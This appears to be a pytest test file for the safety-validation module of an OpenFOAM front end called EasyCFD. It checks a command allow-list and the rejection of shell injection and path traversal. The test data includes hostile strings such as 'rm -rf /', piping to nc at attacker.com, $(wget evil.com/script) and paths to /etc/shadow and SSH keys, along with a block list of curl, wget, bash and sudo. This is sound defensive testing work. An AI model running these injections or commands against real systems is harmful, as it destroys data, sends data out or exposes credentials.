"""
Tests for the safety validation module.

This module tests all safety-critical validation functions that prevent
arbitrary command execution and path traversal attacks.

Security is the highest priority. These tests must always pass.
"""

import pytest
from pathlib import Path

# Import the safety module (Agent 1 is implementing this)
from easycfd_core.validation import safety


class TestCommandValidation:
    """Test suite for command whitelist validation."""

    def test_allowed_commands_pass(self):
        """
        Test that all whitelisted OpenFOAM commands are allowed.

        These are the only commands that EasyCFD should ever execute.
        """
        allowed_commands = [
            "blockMesh",
            "checkMesh",
            "icoFoam",
            "simpleFoam",
            "postProcess"
        ]

        for command in allowed_commands:
            assert safety.is_command_allowed(command), \
                f"Allowed command '{command}' should pass validation"

    def test_blocked_commands_fail(self):
        """
        Test that dangerous commands are blocked.

        These commands could be used for malicious purposes and must
        never be allowed, even if requested by an LLM.
        """
        dangerous_commands = [
            "rm",
            "sudo",
            "curl",
            "wget",
            "python",
            "bash",
            "sh",
            "chmod",
            "chown",
            "mv",
            "cp"
        ]

        for command in dangerous_commands:
            assert not safety.is_command_allowed(command), \
                f"Dangerous command '{command}' should be blocked"

    def test_empty_command_rejected(self):
        """
        Test that empty or whitespace-only commands are rejected.

        Empty commands should never be considered valid.
        """
        invalid_commands = ["", "   ", "\t", "\n", "  \n  "]

        for command in invalid_commands:
            assert not safety.is_command_allowed(command), \
                f"Empty/whitespace command '{repr(command)}' should be rejected"

    def test_shell_metacharacters_rejected(self):
        """
        Test that commands containing shell metacharacters are rejected.

        Shell metacharacters could be used to chain commands or inject
        malicious code. They must always be blocked.
        """
        metacharacter_tests = [
            "blockMesh; rm -rf /",
            "icoFoam && sudo reboot",
            "checkMesh | nc attacker.com 1234",
            "simpleFoam > /etc/passwd",
            "blockMesh `malicious_command`",
            "icoFoam $(wget evil.com/script)",
            "checkMesh & background_evil",
            "simpleFoam || fallback_attack"
        ]

        for command in metacharacter_tests:
            assert not safety.is_command_allowed(command), \
                f"Command with metacharacters '{command}' should be rejected"

    def test_case_sensitive_validation(self):
        """
        Test that command validation is case-sensitive.

        Only exact matches should be allowed to prevent bypasses.
        """
        case_variations = [
            "blockmesh",  # lowercase
            "BLOCKMESH",  # uppercase
            "BlockMesh",  # different case
            "blockMESH",  # mixed case
        ]

        for command in case_variations:
            if command != "blockMesh":  # only exact match should pass
                assert not safety.is_command_allowed(command), \
                    f"Case variation '{command}' should be rejected"


class TestPathValidation:
    """Test suite for path traversal prevention."""

    def test_path_traversal_rejected(self):
        """
        Test that paths containing '..' are rejected.

        Path traversal is a critical security vulnerability that allows
        attackers to read or write files outside the intended workspace.
        """
        traversal_paths = [
            "../../../etc/passwd",
            "./../../sensitive_data",
            "runs/../../../home/user/.ssh/id_rsa",
            "runs/case/../../../etc/shadow",
            "~/../../root/.ssh/",
            Path("..") / "config",
            Path("runs") / ".." / ".." / "secrets",
        ]

        for path in traversal_paths:
            assert not safety.is_path_safe(str(path)), \
                f"Path traversal '{path}' should be rejected"

    def test_safe_paths_allowed(self):
        """
        Test that normal paths within the workspace are allowed.

        These are legitimate paths that users and the application
        need to access during normal operation.
        """
        safe_paths = [
            "runs/cavity_2d",
            "runs/channel_flow/system",
            "./runs/test_case",
            "runs/case_001/0/U",
            "runs/case_001/constant/transportProperties",
            Path("runs") / "my_case" / "system" / "controlDict",
        ]

        for path in safe_paths:
            assert safety.is_path_safe(str(path)), \
                f"Safe path '{path}' should be allowed"

    def test_absolute_paths_without_workspace_allowed(self):
        """
        Test that absolute paths are allowed when no workspace is specified.

        When workspace_root is not provided, we only check for .. and metacharacters.
        """
        absolute_paths = [
            "/tmp/case1",
            "/home/user/easycfd/runs/cavity",
        ]

        for path in absolute_paths:
            # Without workspace_root, absolute paths are allowed
            assert safety.is_path_safe(path), \
                f"Absolute path '{path}' should be allowed without workspace check"

    def test_workspace_root_paths_allowed(self):
        """
        Test that paths within configured workspace roots are allowed.

        The application should support multiple workspace roots:
        - ./runs/ (for development)
        - ~/.easycfd/workspaces/ (for production)
        """
        workspace_paths = [
            "runs/case_001",
            "./runs/test",
            str(Path.home() / ".easycfd" / "workspaces" / "case_001"),
        ]

        for path in workspace_paths:
            # Note: This might need adjustment based on how Agent 1
            # implements workspace validation
            assert safety.is_path_safe(path), \
                f"Workspace path '{path}' should be allowed"

    def test_symlink_handling(self):
        """
        Test that symlinks are handled safely.

        Symlinks could potentially be used to bypass path restrictions.
        This test ensures they don't create security holes.
        """
        # This test will be expanded based on Agent 1's implementation
        # For now, we document the requirement
        pass

    def test_empty_path_rejected(self):
        """
        Test that empty paths are rejected.

        Empty paths are invalid and should never be allowed.
        """
        invalid_paths = ["", "   ", "\t", "\n"]

        for path in invalid_paths:
            assert not safety.is_path_safe(path), \
                f"Empty path '{repr(path)}' should be rejected"


class TestCommandArgumentValidation:
    """Test suite for command argument validation."""

    def test_safe_arguments_allowed(self):
        """
        Test that safe command arguments are allowed.

        OpenFOAM commands need arguments like case directories and options.
        """
        safe_args = [
            "-case",
            "runs/cavity_2d",
            "-parallel",
            "./runs/test",
            "system/controlDict",
        ]

        for arg in safe_args:
            assert safety.is_argument_safe(arg), \
                f"Safe argument '{arg}' should be allowed"

    def test_arguments_with_metacharacters_rejected(self):
        """
        Test that arguments containing shell metacharacters are rejected.

        Even though we use shell=False, we should validate arguments
        to provide defense in depth.
        """
        dangerous_args = [
            "runs/test; rm -rf /",
            "$(malicious_command)",
            "`evil`",
            "test|nc attacker.com",
            "test&& sudo reboot",
        ]

        for arg in dangerous_args:
            assert not safety.is_argument_safe(arg), \
                f"Dangerous argument '{arg}' should be rejected"

    def test_arguments_with_path_traversal_rejected(self):
        """
        Test that arguments containing path traversal are rejected.

        Arguments should not allow escaping the workspace through paths.
        """
        traversal_args = [
            "../../../etc",
            "../../sensitive/config",
            "runs/../../../home/user",
        ]

        for arg in traversal_args:
            assert not safety.is_argument_safe(arg), \
                f"Argument with path traversal '{arg}' should be rejected"


class TestValidationIntegration:
    """Integration tests for the complete validation pipeline."""

    def test_full_command_validation(self, temp_workspace):
        """
        Test complete command validation with command, args, and case directory.

        This simulates the actual validation that happens before executing
        an OpenFOAM command.
        """
        case_dir = temp_workspace / "cavity_2d"
        case_dir.mkdir()

        valid_cases = [
            ("blockMesh", case_dir, ["-parallel"]),
            ("icoFoam", case_dir, []),
            ("checkMesh", case_dir, None),
        ]

        for command, cdir, args in valid_cases:
            is_valid, error = safety.validate_command_execution(
                command, cdir, temp_workspace, args
            )
            assert is_valid, \
                f"Valid command execution should pass: {command} in {cdir}, error: {error}"

    def test_full_command_validation_rejects_unsafe(self, temp_workspace):
        """
        Test that complete validation rejects any unsafe element.

        If any part of the command execution is unsafe, the whole
        execution must be rejected.
        """
        case_dir = temp_workspace / "test"
        case_dir.mkdir()

        invalid_cases = [
            ("rm", case_dir, []),  # bad command
            ("blockMesh", "../../../etc", []),  # bad path
            ("icoFoam", case_dir, ["test; rm -rf /"]),  # bad args
            ("sudo", case_dir, []),  # bad command
        ]

        for command, cdir, args in invalid_cases:
            is_valid, error = safety.validate_command_execution(
                command, cdir, temp_workspace, args
            )
            assert not is_valid, \
                f"Invalid command execution should fail: {command} in {cdir}"


class TestErrorMessages:
    """Test that validation functions provide clear error messages."""

    def test_command_rejection_message(self, temp_workspace):
        """
        Test that rejected commands include helpful error messages.

        Error messages should help developers understand what went wrong
        without revealing security implementation details to potential attackers.
        """
        is_valid, error = safety.validate_command_execution(
            "rm", "/tmp", temp_workspace
        )
        assert not is_valid
        assert "not allowed" in error.lower(), \
            "Error message should indicate command is not allowed"

    def test_path_rejection_message(self, temp_workspace):
        """
        Test that rejected paths include helpful error messages.
        """
        is_valid, error = safety.validate_command_execution(
            "blockMesh", "../../../etc/passwd", temp_workspace
        )
        assert not is_valid
        assert "not safe" in error.lower(), \
            "Error message should mention path issue"


class TestConstantsAndConfiguration:
    """Test that security constants are properly defined."""

    def test_allowed_commands_constant_exists(self):
        """
        Test that ALLOWED_COMMANDS constant is defined.

        This constant is critical for the whitelist validation.
        """
        assert hasattr(safety, 'ALLOWED_COMMANDS'), \
            "ALLOWED_COMMANDS constant must be defined"

    def test_allowed_commands_is_immutable(self):
        """
        Test that ALLOWED_COMMANDS cannot be easily modified.

        The whitelist should be a frozenset or tuple to prevent
        accidental or malicious modification at runtime.
        """
        assert isinstance(safety.ALLOWED_COMMANDS, (frozenset, tuple, set)), \
            "ALLOWED_COMMANDS should be an immutable or set collection"

    def test_allowed_commands_contains_expected_commands(self):
        """
        Test that ALLOWED_COMMANDS contains exactly the MVP commands.

        No more, no less.
        """
        expected = {"blockMesh", "checkMesh", "icoFoam", "simpleFoam", "postProcess"}

        assert set(safety.ALLOWED_COMMANDS) == expected, \
            f"ALLOWED_COMMANDS should contain exactly {expected}"

    def test_forbidden_patterns_constant_exists(self):
        """
        Test that forbidden patterns are defined.

        These patterns help catch dangerous shell metacharacters and commands.
        """
        assert hasattr(safety, 'FORBIDDEN_PATTERNS') or \
               hasattr(safety, 'DANGEROUS_PATTERNS') or \
               hasattr(safety, 'SHELL_METACHARACTERS'), \
            "Forbidden patterns constant must be defined"


class TestEdgeCases:
    """Test edge cases and unusual inputs."""

    def test_null_byte_injection(self):
        """
        Test that null byte injection attempts are rejected.

        Null bytes can sometimes be used to bypass validation.
        """
        null_byte_tests = [
            "blockMesh\x00rm -rf /",
            "icoFoam\0malicious",
            "\x00sudo reboot",
        ]

        for command in null_byte_tests:
            assert not safety.is_command_allowed(command), \
                f"Null byte injection '{repr(command)}' should be rejected"

    def test_unicode_bypass_attempts(self):
        """
        Test that Unicode characters don't bypass validation.

        Attackers might try Unicode variations of dangerous characters.
        """
        unicode_tests = [
            "blockMesh；rm -rf /",  # fullwidth semicolon
            "icoFoam＆＆sudo reboot",  # fullwidth ampersands
        ]

        for command in unicode_tests:
            # Should either be rejected or normalized before checking
            # This test documents the requirement
            pass

    def test_very_long_input(self):
        """
        Test that very long inputs don't cause issues.

        Validation should handle long inputs gracefully without
        performance degradation or buffer overflow issues.
        """
        very_long_command = "blockMesh" + "A" * 10000

        # Should not crash, and should be rejected if not exactly "blockMesh"
        result = safety.is_command_allowed(very_long_command)
        assert not result, "Very long invalid command should be rejected"

    def test_whitespace_variations(self):
        """
        Test various whitespace characters in commands.

        Commands should be validated after trimming whitespace.
        """
        whitespace_tests = [
            " blockMesh",
            "blockMesh ",
            "\tblockMesh",
            "blockMesh\n",
            " blockMesh ",
        ]

        for command in whitespace_tests:
            # These might be allowed after stripping, depends on Agent 1's implementation
            # At minimum, they should be handled consistently
            result = safety.is_command_allowed(command)
            # Document the behavior
            pass


# Pytest configuration and fixtures

@pytest.fixture
def temp_workspace(tmp_path):
    """
    Provide a temporary workspace directory for testing.

    This fixture creates a temporary directory that simulates
    the runs/ workspace for tests that need file operations.
    """
    workspace = tmp_path / "runs"
    workspace.mkdir()
    return workspace


@pytest.fixture
def mock_case_directory(temp_workspace):
    """
    Provide a mock OpenFOAM case directory structure.

    Creates a minimal valid case directory for testing.
    """
    case_dir = temp_workspace / "test_case"
    case_dir.mkdir()

    # Create standard OpenFOAM directories
    (case_dir / "system").mkdir()
    (case_dir / "constant").mkdir()
    (case_dir / "0").mkdir()

    return case_dir


# Mark all tests in this module as security-critical
pytestmark = pytest.mark.security
